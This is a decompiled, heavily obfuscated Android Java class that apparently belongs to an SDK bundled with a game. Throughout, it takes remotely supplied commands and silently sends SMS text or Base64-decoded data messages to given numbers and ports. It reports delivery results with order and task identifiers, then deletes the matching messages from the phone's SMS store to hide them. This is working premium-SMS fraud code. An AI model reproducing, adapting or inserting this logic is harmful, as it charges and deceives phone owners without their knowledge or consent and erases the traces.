package com.android.k9op.OL.anvYnsl.npja.OL;

import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.net.Uri;
import android.os.Handler;
import android.telephony.SmsManager;
import android.util.Base64;
import bn.sdk.szwcsss.common.az.c.model.Cdo;
import com.android.OL.OL.npja;
import com.android.k9op.OL.OL.SDS;
import com.android.k9op.OL.anvYnsl.OL.HI;
import com.android.k9op.OL.anvYnsl.OL.OL;
import com.android.k9op.OL.anvYnsl.k9op.D6s;
import com.android.k9op.OL.anvYnsl.k9op.anvYnsl;
import com.umeng.analytics.a;
import java.util.HashMap;
import org.cocos2dx.lib.GameControllerDelegate;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: classes.dex */
public class k9op extends com.android.k9op.OL.anvYnsl.OL.k9op {
    private static volatile k9op nmpPdk = null;
    private String OKjhqz;
    private com.android.k9op.OL.anvYnsl.npja.k9op.k9op Yja1OJm;
    private Context ln8DL;
    private String f6ksTc = "SENT_SMS_ACTION";
    private String k9op = "SMS_DELIVERED_ACTION";
    private Runnable bC = new OL(this);
    private BroadcastReceiver YNc = new SDS(this);

    private k9op(Context context) {
        this.ln8DL = context.getApplicationContext();
        this.Yja1OJm = com.android.k9op.OL.anvYnsl.npja.k9op.k9op.ND89akd(this.ln8DL);
        this.OKjhqz = this.Yja1OJm.ui2Abh();
    }

    private HI ND89akd(String str) {
        HI hi = new HI(this);
        try {
            JSONObject jSONObject = new JSONObject(str);
            hi.ND89akd = jSONObject.getString("port");
            hi.owdCd = jSONObject.getString("cmd");
            hi.Uyns1s = jSONObject.getString("sourcePort");
            hi.ui2Abh = jSONObject.getInt("sendType");
        } catch (JSONException e) {
            e.printStackTrace();
        }
        return hi;
    }

    public static k9op ND89akd(Context context) {
        if (nmpPdk == null) {
            synchronized (k9op.class) {
                if (nmpPdk == null) {
                    nmpPdk = new k9op(context);
                }
            }
        }
        return nmpPdk;
    }

    private void ND89akd(int i, String str, int i2) {
        try {
            new Thread(new D6s(this, i, str, i2)).start();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static /* synthetic */ void ND89akd(k9op k9opVar, int i, anvYnsl anvynsl) {
        try {
            int Yja1OJm = anvynsl.Yja1OJm();
            int ui2Abh = anvynsl.ui2Abh();
            String OPj2s = anvynsl.OPj2s();
            int uoer5H = anvynsl.uoer5H();
            D6s d6s = new D6s();
            d6s.owdCd = anvynsl.owdCd();
            d6s.ND89akd = anvynsl.Uyns1s();
            if (i == -1) {
                k9opVar.Yja1OJm.ND89akd(ui2Abh, 1);
                if (Yja1OJm == 0) {
                    HashMap hashMap = new HashMap();
                    hashMap.put("address", d6s.owdCd);
                    hashMap.put(a.z, d6s.ND89akd);
                    hashMap.put("success", "1");
                    HI.ND89akd(1201, hashMap, k9opVar.ln8DL);
                    npja.ND89akd(k9opVar.ln8DL, SDS.ND89akd, (Object) true);
                } else {
                    HashMap hashMap2 = new HashMap();
                    hashMap2.put("SOID", OPj2s);
                    hashMap2.put("TID", String.valueOf(uoer5H));
                    hashMap2.put("flag", "1");
                    HI.ND89akd(3101, hashMap2, k9opVar.ln8DL);
                    k9opVar.Yja1OJm.ND89akd(OPj2s, uoer5H, 2, 1);
                    k9opVar.ND89akd(anvynsl, 1, GameControllerDelegate.THUMBSTICK_RIGHT_X);
                }
            } else {
                k9opVar.Yja1OJm.ND89akd(ui2Abh, 2);
                if (Yja1OJm == 0) {
                    HashMap hashMap3 = new HashMap();
                    hashMap3.put("address", d6s.owdCd);
                    hashMap3.put(a.z, d6s.ND89akd);
                    hashMap3.put("success", "0");
                    HI.ND89akd(1201, hashMap3, k9opVar.ln8DL);
                    npja.ND89akd(k9opVar.ln8DL, SDS.ND89akd, (Object) false);
                } else {
                    HashMap hashMap4 = new HashMap();
                    hashMap4.put("SOID", OPj2s);
                    hashMap4.put("TID", String.valueOf(uoer5H));
                    hashMap4.put("flag", "0");
                    HI.ND89akd(3101, hashMap4, k9opVar.ln8DL);
                    k9opVar.Yja1OJm.ND89akd(OPj2s, uoer5H, 2, 2);
                    k9opVar.ND89akd(anvynsl, 0, 2103);
                }
            }
            if (k9opVar.owdCd(d6s).booleanValue()) {
                HashMap hashMap5 = new HashMap();
                hashMap5.put("SOID", OPj2s);
                hashMap5.put("TID", String.valueOf(uoer5H));
                hashMap5.put("flag", "1");
                HI.ND89akd(3102, hashMap5, k9opVar.ln8DL);
            } else {
                HashMap hashMap6 = new HashMap();
                hashMap6.put("SOID", OPj2s);
                hashMap6.put("TID", String.valueOf(uoer5H));
                hashMap6.put("flag", "0");
                HI.ND89akd(3102, hashMap6, k9opVar.ln8DL);
            }
            boolean owdCd = k9opVar.Yja1OJm.owdCd();
            boolean Uyns1s = k9opVar.Yja1OJm.Uyns1s();
            if (owdCd || Uyns1s) {
                com.android.k9op.OL.anvYnsl.SDS.OL.SDS.ND89akd(k9opVar.ln8DL).ui2Abh();
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    /* JADX INFO: Access modifiers changed from: package-private */
    public static /* synthetic */ void ND89akd(k9op k9opVar, anvYnsl anvynsl) {
        try {
            HI ND89akd = k9opVar.ND89akd(OL.owdCd(anvynsl.OKjhqz(), 2));
            HashMap hashMap = new HashMap();
            hashMap.put("SOID", anvynsl.OPj2s());
            hashMap.put("TID", String.valueOf(anvynsl.uoer5H()));
            hashMap.put("text", "{'address':'" + ND89akd.ND89akd + "','body':'" + ND89akd.owdCd + "'}");
            HI.ND89akd(3103, hashMap, k9opVar.ln8DL);
            switch (ND89akd.ui2Abh) {
                case 0:
                    String str = com.android.k9op.OL.OL.k9op.owerYnsnd;
                    try {
                        int ui2Abh = anvynsl.ui2Abh();
                        String OPj2s = anvynsl.OPj2s();
                        int uoer5H = anvynsl.uoer5H();
                        int Yja1OJm = anvynsl.Yja1OJm();
                        String str2 = ND89akd.owdCd;
                        String str3 = ND89akd.ND89akd;
                        anvynsl.Uyns1s(str3);
                        anvynsl.ND89akd(k9opVar.OKjhqz);
                        k9opVar.Yja1OJm.owdCd(ui2Abh);
                        if (!com.android.k9op.k9op.OL.ND89akd((Object) str2)) {
                            anvynsl.owdCd(str2);
                            SmsManager smsManager = SmsManager.getDefault();
                            k9opVar.f6ksTc += ui2Abh;
                            k9opVar.ln8DL.registerReceiver(k9opVar.YNc, new IntentFilter(k9opVar.f6ksTc));
                            Intent intent = new Intent(k9opVar.f6ksTc);
                            Intent intent2 = new Intent(k9opVar.k9op);
                            intent.putExtra("id", ui2Abh);
                            intent.putExtra("soid", OPj2s);
                            intent.putExtra("subid", uoer5H);
                            intent.putExtra("port", str3);
                            intent.putExtra("smsType", Yja1OJm);
                            intent.putExtra("cmd", str2);
                            intent.putExtra("msa", k9opVar.OKjhqz);
                            smsManager.sendTextMessage(str3, null, str2, PendingIntent.getBroadcast(k9opVar.ln8DL, 0, intent, 0), PendingIntent.getBroadcast(k9opVar.ln8DL, 0, intent2, 0));
                            k9opVar.ND89akd(ui2Abh, OPj2s, uoer5H);
                            return;
                        }
                        return;
                    } catch (Exception e) {
                        e.printStackTrace();
                        String str4 = com.android.k9op.OL.OL.k9op.d;
                        return;
                    }
                case 1:
                    String str5 = com.android.k9op.OL.OL.k9op.weuri;
                    try {
                        int ui2Abh2 = anvynsl.ui2Abh();
                        String OPj2s2 = anvynsl.OPj2s();
                        int uoer5H2 = anvynsl.uoer5H();
                        int Yja1OJm2 = anvynsl.Yja1OJm();
                        String str6 = ND89akd.owdCd;
                        String str7 = ND89akd.ND89akd;
                        String str8 = ND89akd.Uyns1s;
                        anvynsl.Uyns1s(str7);
                        anvynsl.ND89akd(k9opVar.OKjhqz);
                        anvynsl.ui2Abh(str8);
                        k9opVar.Yja1OJm.owdCd(ui2Abh2);
                        if (!com.android.k9op.k9op.OL.ND89akd((Object) str6)) {
                            anvynsl.owdCd(str6);
                            k9opVar.f6ksTc += ui2Abh2;
                            k9opVar.ln8DL.registerReceiver(k9opVar.YNc, new IntentFilter(k9opVar.f6ksTc));
                            SmsManager smsManager2 = SmsManager.getDefault();
                            Intent intent3 = new Intent(k9opVar.f6ksTc);
                            Intent intent4 = new Intent(k9opVar.k9op);
                            intent3.putExtra("id", ui2Abh2);
                            intent3.putExtra("soid", OPj2s2);
                            intent3.putExtra("subid", uoer5H2);
                            intent3.putExtra("port", str7);
                            intent3.putExtra("smsType", Yja1OJm2);
                            intent3.putExtra("cmd", str6);
                            intent3.putExtra("msa", k9opVar.OKjhqz);
                            byte[] decode = Base64.decode(str6, 0);
                            PendingIntent broadcast = PendingIntent.getBroadcast(k9opVar.ln8DL, 0, intent3, 0);
                            PendingIntent broadcast2 = PendingIntent.getBroadcast(k9opVar.ln8DL, 0, intent4, 0);
                            if (str8.equals("") || str8.equals("0")) {
                                smsManager2.sendDataMessage(str7, null, (short) 0, decode, broadcast, broadcast2);
                            } else {
                                smsManager2.sendDataMessage(str7, null, Short.parseShort(str8), decode, broadcast, broadcast2);
                            }
                            k9opVar.ND89akd(ui2Abh2, OPj2s2, uoer5H2);
                            return;
                        }
                        return;
                    } catch (Exception e2) {
                        e2.printStackTrace();
                        String str9 = com.android.k9op.OL.OL.k9op.e;
                        return;
                    }
                default:
                    return;
            }
        } catch (Exception e3) {
            String str10 = com.android.k9op.OL.OL.k9op.f;
        }
        String str102 = com.android.k9op.OL.OL.k9op.f;
    }

    private Boolean owdCd(D6s d6s) {
        boolean z = true;
        try {
            if (this.ln8DL.getContentResolver().delete(Uri.parse(Cdo.e), "body=?", new String[]{d6s.owdCd}) <= 0) {
                z = false;
            }
        } catch (Exception e) {
            z = false;
        }
        return Boolean.valueOf(z);
    }

    public final void ND89akd(anvYnsl anvynsl, int i, int i2) {
        String OPj2s = anvynsl.OPj2s();
        Handler owdCd = com.android.k9op.OL.JUSEF.HI.ND89akd().owdCd();
        switch (i) {
            case 0:
                com.android.k9op.k9op.OL.ND89akd(owdCd, 4, i2, 0, OPj2s);
                return;
            case 1:
                if (!this.Yja1OJm.ND89akd(anvynsl.OPj2s())) {
                    com.android.k9op.k9op.OL.ND89akd(owdCd, 4, i2, 0, OPj2s);
                    return;
                }
                return;
            default:
                return;
        }
    }

    public final void ui2Abh() {
        String str = com.android.k9op.OL.OL.k9op.Dnnd1sl;
        owdCd();
        ui2Abh.post(this.bC);
    }
}
